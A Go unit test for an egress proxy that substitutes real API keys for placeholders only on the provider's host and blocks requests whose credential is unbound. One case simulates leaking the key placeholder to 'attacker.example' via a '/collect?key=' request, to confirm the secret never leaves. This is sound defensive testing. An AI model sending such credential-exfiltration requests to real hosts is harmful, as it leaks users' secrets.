package egress

import (
	"context"
	"net"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
)

// A provider key reaches only the provider's own host. Anywhere else the
// upstream sees the placeholder, so a container that sends its sentinel to
// another host learns nothing.
func TestSubstitutionReachesOnlyTheServiceHost(t *testing.T) {
	t.Parallel()

	cases := []struct {
		name      string
		host      string
		target    string
		wantKey   bool
		wantError bool
		resolve   func() (string, error)
	}{
		{name: "the service host gets the key", host: "api.openai.example", target: "/v1/chat?key=" + SentinelFor("openai"), wantKey: true},
		{name: "another host keeps the placeholder", host: "attacker.example", target: "/collect?key=" + SentinelFor("openai")},
		{
			name: "an unbound credential stops the request", host: "api.openai.example", target: "/v1/chat", wantError: true,
			resolve: func() (string, error) { return "", ErrUnbound },
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()

			var seen *http.Request
			upstream := httptest.NewServer(http.HandlerFunc(func(_ http.ResponseWriter, r *http.Request) { seen = r }))
			defer upstream.Close()

			resolve := tc.resolve
			if resolve == nil {
				resolve = func() (string, error) { return "real-key", nil }
			}
			proxy := NewProxy(nil, ProxyOptions{
				Resolver: ResolverFunc(func(context.Context, string, string) (string, error) { return resolve() }),
				Dial: func(ctx context.Context, _, _ string) (net.Conn, error) {
					return (&net.Dialer{}).DialContext(ctx, "tcp", upstream.Listener.Addr().String())
				},
			})
			session := &Session{token: "run-token", substitutions: compileSubstitutions([]Substitution{{Service: "openai", Host: "api.openai.example"}})}

			req := httptest.NewRequestWithContext(context.Background(), http.MethodPost, "http://"+tc.host+tc.target, nil)
			req.Header.Set("Authorization", "Bearer "+SentinelFor("openai"))
			rec := httptest.NewRecorder()
			proxy.forward(context.Background(), rec, req, session, "http", tc.host, 80)

			if tc.wantError {
				if rec.Code != http.StatusBadGateway || seen != nil {
					t.Fatalf("status = %d, forwarded = %v; want 502 and nothing forwarded", rec.Code, seen != nil)
				}
				return
			}
			if seen == nil {
				t.Fatalf("request not forwarded: %d %q", rec.Code, rec.Body.String())
			}
			got := seen.Header.Get("Authorization") + " " + seen.URL.RawQuery
			if strings.Contains(got, "real-key") != tc.wantKey {
				t.Fatalf("upstream saw %q; key present = %v, want %v", got, !tc.wantKey, tc.wantKey)
			}
			if tc.wantKey && strings.Contains(got, Sentinel) {
				t.Fatalf("a sentinel survived on the service host: %q", got)
			}
		})
	}
}
